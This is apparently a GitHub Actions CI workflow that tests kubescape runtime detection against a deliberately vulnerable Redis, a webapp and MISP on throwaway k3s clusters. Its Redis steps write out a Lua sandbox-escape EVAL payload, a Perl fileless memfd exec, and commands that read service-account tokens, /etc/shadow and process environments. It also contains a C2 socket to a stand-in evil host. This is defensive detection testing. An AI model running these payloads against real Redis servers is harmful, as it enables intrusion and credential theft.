name: CI - bobctl tune

on:
  push:
    branches:
      - main
      - feature/tuning
      - feature/redis
    paths:
      - 'pkg'
      - 'pkg/**'
      - 'kubescape/**'
      - 'example/**'
      - 'misp/**'
      - '.github/workflows/**'
      - 'Makefile'
  workflow_dispatch:
  repository_dispatch:
    types: [node-agent-build-complete]


jobs:
  build:
    name: Build bobctl
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repo and private submodules
        uses: actions/checkout@v4
        with:
          submodules: 'recursive'
          token: ${{ secrets.ENTLEIN_PAT}}

      - name: Clone storage dependency
        run: |
          git clone --depth 1 --branch feature/collapse-config-crd https://github.com/k8sstormcenter/storage.git ../storage

      - name: Verify layout
        run: |
          ls pkg/go.mod pkg/main.go
          ls ../storage/go.mod

      - name: Set up Go
        uses: actions/setup-go@v5
        with:
          go-version: '1.25'
          cache-dependency-path: pkg/go.sum

      - name: Build bobctl
        working-directory: pkg
        run: |
          go build -o ../bin/bobctl ./main.go

      - name: Upload bobctl binary
        uses: actions/upload-artifact@v4
        with:
          name: bobctl
          path: bin/bobctl

  tune:
    name: "${{ matrix.app }} (${{ matrix.os }}, ${{ matrix.k8s-distribution }})"
    needs: build
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-22.04, ubuntu-24.04]
        k8s-distribution: [k3s]
        kubernetes-version: [v1.33.3]
        # Each app entry defines its manifest, tests, attacks, and namespace.
        # To add a new application, add another entry here.
        app:
          - webapp
          - redis
        include:
          # ---- webapp (HTTP-based PHP app) ----
          - app: webapp
            manifest: example/webapp-manifest.yaml
            functional_tests: example/webapp-functional-tests.yaml
            attack_suite: example/webapp-attacks.yaml
            app_namespace: webapp
            deploy_name: webapp-mywebapp
            deploy_kind: deployment
            protocol: http
          # ---- redis (TCP RESP, CVE-2025-49844 fileless) ----
          - app: redis
            manifest: example/redis-vulnerable.yaml
            functional_tests: example/redis-functional-tests.yaml
            attack_suite: example/redis-attacks.yaml
            app_namespace: redis
            deploy_name: redis
            deploy_kind: deployment
            protocol: redis
    runs-on: ${{ matrix.os }}

    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          token: ${{ secrets.ENTLEIN_PAT}}

      - name: Patch image tags from dispatch
        if: github.event_name == 'repository_dispatch'
        run: |
          TAG="${{ github.event.client_payload.image_tag }}"
          echo "Patching kubescape/values.yaml with tag: ${TAG}"
          sed -i "s|tag: \"dev-[a-f0-9]*\"|tag: \"${TAG}\"|g" kubescape/values.yaml
          echo "Updated values.yaml:"
          grep 'tag:' kubescape/values.yaml

      - name: Download bobctl binary
        uses: actions/download-artifact@v4
        with:
          name: bobctl
          path: bin

      - name: Make bobctl executable
        run: chmod +x bin/bobctl

      - name: Set up k3s cluster
        if: matrix.k8s-distribution == 'k3s'
        uses: jupyterhub/action-k3s-helm@v4
        with:
          k3s-version: ${{ matrix.kubernetes-version }}+k3s1

      - name: Set up Kind cluster
        if: matrix.k8s-distribution == 'kind'
        uses: helm/kind-action@v1
        with:
          node_image: kindest/node:${{ matrix.kubernetes-version }}

      - name: Verify cluster
        run: |
          kubectl version
          kubectl get nodes
          uname -a
          helm version

      - name: Install kubescape
        run: make kubescape

      - name: Install alertmanager
        run: make alertmanager

      # ---------- Application deployment (generic) ----------
      - name: Deploy application
        run: |
          echo "Deploying ${{ matrix.app }} from ${{ matrix.manifest }}"
          kubectl apply -f ${{ matrix.manifest }}
          kubectl wait --for=condition=available --timeout=120s \
            ${{ matrix.deploy_kind }}/${{ matrix.deploy_name }} \
            -n ${{ matrix.app_namespace }}

      - name: Wait for kubescape components
        run: |
          kubectl wait --for=condition=ready pod -l app=node-agent -n honey --timeout=180s
          kubectl wait --for=condition=ready pod -l app=storage -n honey --timeout=180s
          kubectl wait --for=condition=ready pod -l app=alertmanager -n honey --timeout=120s

      # ---------- Profile learning ----------
      - name: Install and learn application
        id: profile
        run: |
          bin/bobctl install \
            --manifest ${{ matrix.manifest }} \
            --functional-tests ${{ matrix.functional_tests }} \
            -n ${{ matrix.app_namespace }} \
            --timeout 10m \
            -v > /tmp/profile-name.txt
          PROFILE=$(cat /tmp/profile-name.txt)
          echo "name=$PROFILE" >> "$GITHUB_OUTPUT"
          echo "Discovered profile: $PROFILE"
          kubectl get applicationprofile $PROFILE -n ${{ matrix.app_namespace }} -o yaml > profile.yaml
          cat profile.yaml



      # ---------- Collapse analysis ----------
      - name: Run collapse analysis
        continue-on-error: true
        run: |
          mkdir -p results
          bin/bobctl collapse \
            --namespaces ${{ matrix.app_namespace }} \
            --noisy-threshold 10 \
            --apply \
            -v 2>&1 | tee results/collapse-analysis.txt

      # ---------- Tune (strategy sweep) ----------
      - name: Run tune
        id: tune
        continue-on-error: true
        run: |
          mkdir -p results
          bin/bobctl tune \
            --profile "${{ steps.profile.outputs.name }}" \
            -n ${{ matrix.app_namespace }} \
            --ks-namespace honey \
            --functional-tests ${{ matrix.functional_tests }} \
            --attack-suite ${{ matrix.attack_suite }} \
            --alertmanager-service alertmanager \
            --alertmanager-port 9093 \
            --output-dir results \
            --debug \
            -v 2>&1 | tee /tmp/tune-output.txt

      # ---------- Redis post-tune attacks (Redis only) ----------
      # After tune runs RESP-level CVE payloads through bobctl, we also
      # execute the full attack chain directly inside the Redis container
      # to ensure node-agent detects each attack type. The 12 attacks cover:
      # R1005, R0006, R0010, R0001, R0005, R1001, R1000, R0008, R1010, R1008
      - name: "Run Redis post-tune attack verification"
        if: matrix.protocol == 'redis'
        run: |
          REDIS_POD=$(kubectl -n redis get pod -l app.kubernetes.io/name=redis \
            -o jsonpath='{.items[0].metadata.name}')
          echo "=== Running 12 Redis attacks in pod $REDIS_POD ==="

          LUA_ESCAPE='local io_mod=nil;pcall(function() if type(io)=="table" and io.popen then io_mod=io end end);if not io_mod then pcall(function() local l=package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0","luaopen_io");if l then io_mod=l() end end) end;if not io_mod then return "sandbox_blocked" end;'

          run_eval() {
            local name="$1" script="$2"
            echo -n "  [$name] "
            result=$(kubectl -n redis exec "$REDIS_POD" -- redis-cli EVAL "$script" 0 2>&1) || true
            echo "$(echo $result | head -c 80)"
          }

          # 1: Fileless memfd_create + execve (R1005)
          echo "--- Attack 1: Fileless memfd (R1005) ---"
          kubectl -n redis exec "$REDIS_POD" -- perl -e '
            my $name = "pwned\0";
            my $fd = syscall(319, $name, 0);
            die "memfd_create failed: $!\n" if $fd < 0;
            open(my $src, "<:raw", "/bin/echo") or die "open: $!\n";
            open(my $dst, ">&=", $fd) or die "fdopen: $!\n";
            binmode $dst; my $buf;
            while (my $n = read($src, $buf, 8192)) { print $dst $buf; }
            close($src);
            exec("/proc/self/fd/$fd", "echo", "FILELESS-EXEC-DETECTED");
          ' || echo "  memfd exec completed"

          # 2: SA token exfil (R0006)
          run_eval "SA-token-R0006" "${LUA_ESCAPE} local f=io_mod.popen('cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo no_token');local o=f:read('*a');f:close();return o"

          # 3: /etc/shadow (R0010)
          run_eval "shadow-R0010" "${LUA_ESCAPE} local f=io_mod.popen('cat /etc/shadow 2>&1; echo shadow_attempted');local o=f:read('*a');f:close();return o"

          # 4: whoami (R0001)
          run_eval "whoami-R0001" "${LUA_ESCAPE} local f=io_mod.popen('whoami');local o=f:read('*a');f:close();return 'user:' .. o"

          # 5: DNS anomaly (R0005)
          run_eval "dns-R0005" "${LUA_ESCAPE} local f=io_mod.popen('getent hosts evil.attacker.example.com 2>&1 || echo dns_done');local o=f:read('*a');f:close();return 'dns:' .. o"

          # 6: Drifted binary (R1001)
          run_eval "drifted-R1001" "${LUA_ESCAPE} local f=io_mod.popen('cp /bin/ls /tmp/drifted_redis && /tmp/drifted_redis /etc 2>&1; rm -f /tmp/drifted_redis');local o=f:read('*a');f:close();return 'drifted:' .. o"

          # 7: /dev/shm exec (R1000)
          run_eval "devshm-R1000" "${LUA_ESCAPE} local f=io_mod.popen('cp /bin/echo /dev/shm/malicious && /dev/shm/malicious pwned 2>&1; rm -f /dev/shm/malicious');local o=f:read('*a');f:close();return 'shm:' .. o"

          # 8: /proc/environ (R0008)
          run_eval "environ-R0008" "${LUA_ESCAPE} local f=io_mod.popen('cat /proc/1/environ 2>/dev/null | tr \"\\\\0\" \"\\\\n\" | head -1 || echo no_environ');local o=f:read('*a');f:close();return 'environ:' .. o"

          # 9: Symlink shadow (R1010)
          run_eval "symlink-R1010" "${LUA_ESCAPE} local f=io_mod.popen('ln -sf /etc/shadow /tmp/shadow_link 2>&1; rm -f /tmp/shadow_link; echo symlink_done');local o=f:read('*a');f:close();return 'symlink:' .. o"

          # 10: Crypto mining DNS (R1008)
          run_eval "mining-R1008" "${LUA_ESCAPE} local f=io_mod.popen('getent hosts xmr.pool.minergate.com 2>&1 || echo mining_dns_done');local o=f:read('*a');f:close();return 'mining:' .. o"

          # 11: Perl C2 connection (R0001+R0005)
          run_eval "perl-c2-R0001" "${LUA_ESCAPE} local f=io_mod.popen(\"perl -e 'use IO::Socket::INET;my \\$s=IO::Socket::INET->new(PeerAddr=>\\\"c2.evil.example.com\\\",PeerPort=>80,Timeout=>2);print defined \\$s ? \\\"ok\\\" : \\\"fail\\\";' 2>&1; echo done\");local o=f:read('*a');f:close();return 'c2:' .. o"

          # 12: Credential harvest (R0001)
          run_eval "creds-R0001" "${LUA_ESCAPE} local f=io_mod.popen(\"awk -F: '\\$3==0{print \\$1}' /etc/passwd && id 2>&1\");local o=f:read('*a');f:close();return 'creds:' .. o"

          echo ""
          echo "All 12 Redis attacks executed. Waiting for alert propagation..."
          sleep 15

      # ---------- Cross-pod endpoint test (Redis only) ----------
      # Attacks from redis-client pod → Redis service over the network.
      # Tests endpoint detection: node-agent sees real pod-to-pod traffic.
      # Verifies whether port=0 wildcard in ApplicationProfile allows any port.
      - name: "Run Redis cross-pod endpoint test"
        if: matrix.protocol == 'redis'
        run: |
          echo "=== Cross-pod endpoint test ==="
          kubectl -n redis wait --for=condition=ready pod -l app.kubernetes.io/name=redis-client --timeout=60s 2>/dev/null || true
          CLIENT_POD=$(kubectl -n redis get pod -l app.kubernetes.io/name=redis-client \
            -o jsonpath='{.items[0].metadata.name}' 2>/dev/null) || true

          if [ -z "$CLIENT_POD" ]; then
            echo "WARNING: redis-client pod not found, skipping cross-pod tests"
            exit 0
          fi

          echo "Client pod: $CLIENT_POD"

          LUA_ESCAPE='local io_mod=nil;pcall(function() if type(io)=="table" and io.popen then io_mod=io end end);if not io_mod then pcall(function() local l=package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0","luaopen_io");if l then io_mod=l() end end) end;if not io_mod then return "sandbox_blocked" end;'

          # Benign: PING via standard port (should be in profile)
          echo "  Cross-pod benign: PING via redis:6379"
          kubectl -n redis exec "$CLIENT_POD" -- redis-cli -h redis -p 6379 PING 2>&1 || true

          # Benign: SET/GET via standard port
          echo "  Cross-pod benign: SET/GET via redis:6379"
          kubectl -n redis exec "$CLIENT_POD" -- redis-cli -h redis -p 6379 SET crosstest hello 2>&1 || true
          kubectl -n redis exec "$CLIENT_POD" -- redis-cli -h redis -p 6379 GET crosstest 2>&1 || true

          # Alt-port: PING via non-standard port 16379 (redis-alt-port service)
          # If profile has port=6379, this should be an endpoint anomaly.
          # If profile has port=0 (wildcard), this is silently allowed.
          echo "  Cross-pod alt-port: PING via redis-alt-port:16379"
          kubectl -n redis exec "$CLIENT_POD" -- redis-cli -h redis-alt-port -p 16379 PING 2>&1 || true

          # Attack: Lua sandbox escape from cross-pod client
          echo "  Cross-pod attack: Lua exploit via redis:6379"
          kubectl -n redis exec "$CLIENT_POD" -- redis-cli -h redis -p 6379 \
            EVAL "${LUA_ESCAPE} local f=io_mod.popen('whoami');local o=f:read('*a');f:close();return 'crosspod:' .. o" 0 2>&1 || true

          # Attack: Same exploit via alt-port
          echo "  Cross-pod attack: Lua exploit via redis-alt-port:16379"
          kubectl -n redis exec "$CLIENT_POD" -- redis-cli -h redis-alt-port -p 16379 \
            EVAL "${LUA_ESCAPE} local f=io_mod.popen('id');local o=f:read('*a');f:close();return 'altport:' .. o" 0 2>&1 || true

          # Dump learned profile endpoints for verification
          echo "  Profile endpoints:"
          kubectl get applicationprofile -n redis -o jsonpath='{range .items[*]}{.metadata.name}{": "}{range .spec.containers[*]}{.name}={.endpoints}{" "}{end}{"\n"}{end}' 2>/dev/null || echo "  (no profiles found)"

          sleep 10

      # ---------- Verification ----------
      - name: Export tuned ApplicationProfile
        if: always()
        run: |
          mkdir -p results
          bin/bobctl get "${{ steps.profile.outputs.name }}" \
            -n ${{ matrix.app_namespace }} -o yaml > results/tuned-profile.yaml || true
          echo "Exported tuned profile ($(wc -l < results/tuned-profile.yaml) lines)"
          echo "Iteration profiles saved by --output-dir:"
          ls -la results/*-iteration*.yaml 2>/dev/null || echo "  (none)"
          cat results/*-iteration*.yaml

      - name: Display collapse analysis
        if: always()
        run: |
          echo "=== Collapse Analysis ==="
          if [ -f results/collapse-analysis.txt ]; then
            cat results/collapse-analysis.txt
          else
            echo "  (no collapse analysis output found)"
          fi

      - name: Display tune metrics
        if: always()
        run: |
          echo "=== Tune Metrics ==="
          if [ -f results/metrics.json ]; then
            echo "--- metrics.json ---"
            cat results/metrics.json
          fi
          if [ -f results/metrics.md ]; then
            echo "--- metrics.md ---"
            cat results/metrics.md
            echo "### ${{ matrix.app }} (${{ matrix.os }})" >> $GITHUB_STEP_SUMMARY
            cat results/metrics.md >> $GITHUB_STEP_SUMMARY
            echo "" >> $GITHUB_STEP_SUMMARY
          else
            echo "  (no metrics output — tune may have failed before producing metrics)"
          fi

      - name: Render tune metrics GIF
        if: always()
        run: |
          if [ -f results/metrics.json ]; then
            ./scripts/render-gif.sh \
              results/metrics.json \
              results/tune.gif \
              --title "${{ matrix.app }} (${{ matrix.os }})"
            echo "GIF: $(ls -lh results/tune.gif | awk '{print $5}')"
          else
            echo "No metrics.json — skipping GIF"
          fi

      - name: Run explicit attacks
        if: always()
        run: |
          mkdir -p results
          bin/bobctl attack \
            --attack-suite ${{ matrix.attack_suite }} \
            -n ${{ matrix.app_namespace }} \
            --format markdown | tee results/attack-results.md

      - name: Generate detection report
        if: always()
        run: |
          sleep 15  # wait for alert propagation
          mkdir -p results
          bin/bobctl report \
            --alertmanager-service alertmanager \
            --alertmanager-port 9093 \
            --ks-namespace honey \
            -n ${{ matrix.app_namespace }} \
            --format markdown | tee results/detection-report.md

      - name: Check node-agent logs for detections
        if: always()
        run: |
          echo "=== Node-agent alerts for ${{ matrix.app_namespace }} namespace ==="
          kubectl logs -n honey -l app=node-agent --tail=500 \
            | grep '"namespace":"${{ matrix.app_namespace }}"' \
            | grep '"level":"error"' \
            | python3 -c "
          import json, sys
          from collections import Counter
          rules = Counter()
          for line in sys.stdin:
              try:
                  d = json.loads(line.strip())
                  rid = d.get('RuleID', '')
                  alert = d.get('BaseRuntimeMetadata', {}).get('alertName', '')
                  sev = d.get('BaseRuntimeMetadata', {}).get('severity', '?')
                  if rid:
                      rules[(rid, alert, sev)] += 1
              except: pass
          for (rid, alert, sev), count in sorted(rules.items()):
              print(f'  {rid}: {alert} (severity={sev}, count={count})')
          " || echo "  (no detections found or parsing failed)"

      - name: Collect diagnostics
        if: always()
        run: |
          echo "--- Node-agent logs (last 100) ---"
          kubectl logs -n honey -l app=node-agent --tail=100 || true
          echo "--- Storage logs (last 50) ---"
          kubectl logs -n honey -l app=storage --tail=50 || true
          echo "--- Alertmanager alerts ---"
          kubectl get --raw "/api/v1/namespaces/honey/services/alertmanager:9093/proxy/api/v2/alerts?active=true" \
            2>/dev/null | jq '.[].labels' || echo "No alerts or alertmanager unreachable"

      - name: Prepare result artifact
        if: always()
        run: |
          KERNEL_VERSION=$(uname -r)
          mkdir -p results

          # Extract metrics from structured metrics.json (written by bobctl tune)
          IMAGE_TAG=$(grep 'tag:' kubescape/values.yaml | head -1 | sed 's/.*tag: "\(.*\)"/\1/')
          RESULT="${{ steps.tune.outcome }}"
          if [ -f results/metrics.json ]; then
            LAST_IDX=$(jq 'length - 1' results/metrics.json)
            SCORE=$(jq ".[$LAST_IDX].score" results/metrics.json)
            MISSED=$(jq ".[$LAST_IDX].missed_detections" results/metrics.json)
            FP=$(jq ".[$LAST_IDX].false_positives" results/metrics.json)
          else
            SCORE="N/A"
            MISSED="N/A"
            FP="N/A"
          fi

          jq -n \
            --arg app "${{ matrix.app }}" \
            --arg os "${{ matrix.os }}" \
            --arg k8s_distribution "${{ matrix.k8s-distribution }}" \
            --arg kubernetes_version "${{ matrix.kubernetes-version }}" \
            --arg kernel_version "$KERNEL_VERSION" \
            --arg profile "${{ steps.profile.outputs.name }}" \
            --arg tune_exit_code "$RESULT" \
            --arg image_tag "$IMAGE_TAG" \
            --arg score "$SCORE" \
            --arg missed "$MISSED" \
            --arg false_positives "$FP" \
            --arg protocol "${{ matrix.protocol }}" \
            --arg result "$RESULT" \
            '{
              app: $app,
              os: $os,
              k8s_distribution: $k8s_distribution,
              kubernetes_version: $kubernetes_version,
              kernel_version: $kernel_version,
              profile: $profile,
              tune_exit_code: $tune_exit_code,
              image_tag: $image_tag,
              score: $score,
              missed: $missed,
              false_positives: $false_positives,
              protocol: $protocol,
              result: $result
            }' > results/summary.json
          cp /tmp/tune-output.txt results/ 2>/dev/null || true

      - name: Upload result artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: result-${{ matrix.app }}-${{ matrix.os }}-${{ matrix.k8s-distribution }}-${{ matrix.kubernetes-version }}
          path: results/

  deploy-misp:
    name: "misp (${{ matrix.os }}, ${{ matrix.k8s-distribution }})"
    needs: build
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-24.04]
        k8s-distribution: [k3s]
        kubernetes-version: [v1.33.3]
    runs-on: ${{ matrix.os }}

    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          token: ${{ secrets.ENTLEIN_PAT}}

      - name: Download bobctl binary
        uses: actions/download-artifact@v4
        with:
          name: bobctl
          path: bin

      - name: Make bobctl executable
        run: chmod +x bin/bobctl

      - name: Set up k3s cluster
        if: matrix.k8s-distribution == 'k3s'
        uses: jupyterhub/action-k3s-helm@v4
        with:
          k3s-version: ${{ matrix.kubernetes-version }}+k3s1

      - name: Verify cluster
        run: |
          kubectl version
          kubectl get nodes
          helm version

      - name: Install kubescape
        run: make kubescape

      - name: Install alertmanager
        run: make alertmanager

      # ---------- MISP deployment via Helm ----------
      - name: Build MISP chart dependencies
        run: |
          helm repo add bitnami https://charts.bitnami.com/bitnami
          helm repo update
          helm dependency build ./misp

      - name: Deploy MISP
        run: |
          echo "Deploying MISP via Helm chart..."
          kubectl create namespace misp || true
          helm install misp ./misp \
            -f misp/values-ci.yaml \
            -n misp \
            --disable-openapi-validation \
            --timeout 10m \
            --wait=false
          echo "Helm install submitted."

      - name: Wait for MariaDB
        run: |
          echo "Waiting for MariaDB..."
          kubectl wait --for=condition=ready pod -l app.kubernetes.io/name=mariadb \
            -n misp --timeout=300s

      - name: Wait for Valkey
        run: |
          echo "Waiting for Valkey..."
          kubectl wait --for=condition=ready pod -l app.kubernetes.io/name=valkey \
            -n misp --timeout=180s

      - name: Wait for MISP core
        run: |
          echo "Waiting for MISP core pod (startup takes several minutes)..."
          # MISP needs time to initialize DB, run migrations, start supervisord
          kubectl wait --for=condition=ready pod -l app.kubernetes.io/name=misp \
            -n misp --timeout=600s || {
            echo "=== MISP pod not ready, checking status ==="
            kubectl get pods -n misp
            kubectl describe pod -l app.kubernetes.io/name=misp -n misp
            kubectl logs -l app.kubernetes.io/name=misp -n misp --tail=100
            # Continue even if not fully ready — startup probe may pass later
            true
          }

      - name: Verify MISP responds
        run: |
          echo "Checking MISP service..."
          kubectl get svc -n misp
          kubectl get pods -n misp
          # Verify MISP HTTPS endpoint responds via kubectl port-forward
          kubectl port-forward svc/misp 8443:443 -n misp &
          PF_PID=$!
          sleep 5
          HTTP_CODE=$(curl -sk -o /dev/null -w '%{http_code}' https://localhost:8443/ || echo "000")
          kill $PF_PID 2>/dev/null || true
          echo "MISP HTTP response code: $HTTP_CODE"
          if [ "$HTTP_CODE" = "000" ]; then
            echo "Warning: MISP not responding yet (may still be initializing)"
          else
            echo "MISP is serving traffic (HTTP $HTTP_CODE)"
          fi

      - name: Wait for kubescape components
        run: |
          kubectl wait --for=condition=ready pod -l app=node-agent -n honey --timeout=180s
          kubectl wait --for=condition=ready pod -l app=storage -n honey --timeout=180s
          kubectl wait --for=condition=ready pod -l app=alertmanager -n honey --timeout=120s

      # ---------- Profile learning ----------
      - name: Learn MISP profile
        id: profile
        continue-on-error: true
        run: |
          echo "Waiting for kubescape to observe MISP workload..."
          sleep 60
          # List application profiles in misp namespace
          echo "=== ApplicationProfiles in misp namespace ==="
          kubectl get applicationprofile -n misp -o wide || echo "(none yet)"
          # Export the profile if available
          PROFILE=$(kubectl get applicationprofile -n misp -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")
          if [ -n "$PROFILE" ]; then
            echo "name=$PROFILE" >> "$GITHUB_OUTPUT"
            echo "Discovered profile: $PROFILE"
            kubectl get applicationprofile "$PROFILE" -n misp -o yaml > profile.yaml
            cat profile.yaml
          else
            echo "No application profile discovered yet — kubescape may need more time"
            echo "name=" >> "$GITHUB_OUTPUT"
          fi

      # ---------- Diagnostics ----------
      - name: Collect diagnostics
        if: always()
        run: |
          echo "--- MISP pods ---"
          kubectl get pods -n misp -o wide
          echo "--- MISP pod logs (last 100) ---"
          kubectl logs -l app.kubernetes.io/name=misp -n misp --tail=100 || true
          echo "--- MariaDB logs (last 50) ---"
          kubectl logs -l app.kubernetes.io/name=mariadb -n misp --tail=50 || true
          echo "--- Valkey logs (last 50) ---"
          kubectl logs -l app.kubernetes.io/name=valkey -n misp --tail=50 || true
          echo "--- Node-agent logs for misp namespace ---"
          kubectl logs -n honey -l app=node-agent --tail=200 \
            | grep '"namespace":"misp"' || echo "(no misp-namespace entries)"

      - name: Prepare result artifact
        if: always()
        run: |
          KERNEL_VERSION=$(uname -r)
          mkdir -p results
          PROFILE="${{ steps.profile.outputs.name }}"
          # Export profile if available
          if [ -n "$PROFILE" ]; then
            kubectl get applicationprofile "$PROFILE" -n misp -o yaml > results/misp-profile.yaml || true
          fi
          # Check MISP pod status
          MISP_READY=$(kubectl get pod -l app.kubernetes.io/name=misp -n misp \
            -o jsonpath='{.items[0].status.conditions[?(@.type=="Ready")].status}' 2>/dev/null || echo "Unknown")
          jq -n \
            --arg app "misp" \
            --arg os "${{ matrix.os }}" \
            --arg k8s_distribution "${{ matrix.k8s-distribution }}" \
            --arg kubernetes_version "${{ matrix.kubernetes-version }}" \
            --arg kernel_version "$KERNEL_VERSION" \
            --arg profile "$PROFILE" \
            --arg misp_ready "$MISP_READY" \
            --arg result "$( [ "$MISP_READY" = "True" ] && echo success || echo partial )" \
            '{
              app: $app,
              os: $os,
              k8s_distribution: $k8s_distribution,
              kubernetes_version: $kubernetes_version,
              kernel_version: $kernel_version,
              profile: $profile,
              misp_ready: $misp_ready,
              result: $result
            }' > results/summary.json

      - name: Upload result artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: result-misp-${{ matrix.os }}-${{ matrix.k8s-distribution }}-${{ matrix.kubernetes-version }}
          path: results/

  summarize:
    name: Summary
    runs-on: ubuntu-latest
    needs: [tune, deploy-misp]
    if: always()
    steps:
      - name: Download all artifacts
        uses: actions/download-artifact@v4
        with:
          path: artifacts

      - name: Generate summary table
        run: |
          echo '### bobctl tune — Matrix Results' >> $GITHUB_STEP_SUMMARY
          echo '' >> $GITHUB_STEP_SUMMARY
          echo '| App | OS | K8s Distro | K8s Version | Kernel | Image Tag | Protocol | Profile | Score | Missed | FP | Result |' >> $GITHUB_STEP_SUMMARY
          echo '|-----|-----|------------|-------------|--------|-----------|----------|---------|-------|--------|----|--------|' >> $GITHUB_STEP_SUMMARY

          for dir in artifacts/result-*; do
            if [ -f "$dir/summary.json" ]; then
              APP=$(jq -r '.app // "N/A"' "$dir/summary.json")
              OS=$(jq -r '.os' "$dir/summary.json")
              K8S_DISTRO=$(jq -r '.k8s_distribution' "$dir/summary.json")
              K8S_VERSION=$(jq -r '.kubernetes_version' "$dir/summary.json")
              KERNEL=$(jq -r '.kernel_version' "$dir/summary.json")
              PROFILE=$(jq -r '.profile' "$dir/summary.json")
              EXIT=$(jq -r '.tune_exit_code' "$dir/summary.json")
              IMAGE_TAG=$(jq -r '.image_tag // "N/A"' "$dir/summary.json")
              PROTOCOL=$(jq -r '.protocol // "http"' "$dir/summary.json")
              SCORE=$(jq -r '.score // "N/A"' "$dir/summary.json")
              MISSED=$(jq -r '.missed // "0"' "$dir/summary.json")
              FP=$(jq -r '.false_positives // "0"' "$dir/summary.json")
              if [ "$EXIT" == "success" ]; then STATUS="Pass"; else STATUS="$EXIT"; fi
              echo "| $APP | $OS | $K8S_DISTRO | $K8S_VERSION | $KERNEL | \`$IMAGE_TAG\` | $PROTOCOL | \`$PROFILE\` | $SCORE | $MISSED | $FP | $STATUS |" >> $GITHUB_STEP_SUMMARY
            fi
          done

          # Append per-variant profile evolution + detection details
          echo '' >> $GITHUB_STEP_SUMMARY
          for dir in artifacts/result-*; do
            VARIANT=$(basename "$dir" | sed 's/^result-//')
            HAS_CONTENT=false
            [ -f "$dir/metrics.md" ] || [ -f "$dir/detection-report.md" ] || [ -f "$dir/attack-results.md" ] && HAS_CONTENT=true
            if $HAS_CONTENT; then
              echo "<details>" >> $GITHUB_STEP_SUMMARY
              echo "<summary><b>$VARIANT</b></summary>" >> $GITHUB_STEP_SUMMARY
              echo '' >> $GITHUB_STEP_SUMMARY
              if [ -f "$dir/metrics.md" ]; then
                cat "$dir/metrics.md" >> $GITHUB_STEP_SUMMARY
                echo '' >> $GITHUB_STEP_SUMMARY
              fi
              if [ -f "$dir/attack-results.md" ]; then
                echo '#### Attack Results' >> $GITHUB_STEP_SUMMARY
                cat "$dir/attack-results.md" >> $GITHUB_STEP_SUMMARY
                echo '' >> $GITHUB_STEP_SUMMARY
              fi
              if [ -f "$dir/detection-report.md" ]; then
                echo '#### Detection Matrix' >> $GITHUB_STEP_SUMMARY
                cat "$dir/detection-report.md" >> $GITHUB_STEP_SUMMARY
                echo '' >> $GITHUB_STEP_SUMMARY
              fi
              echo "</details>" >> $GITHUB_STEP_SUMMARY
              echo '' >> $GITHUB_STEP_SUMMARY
            fi
          done
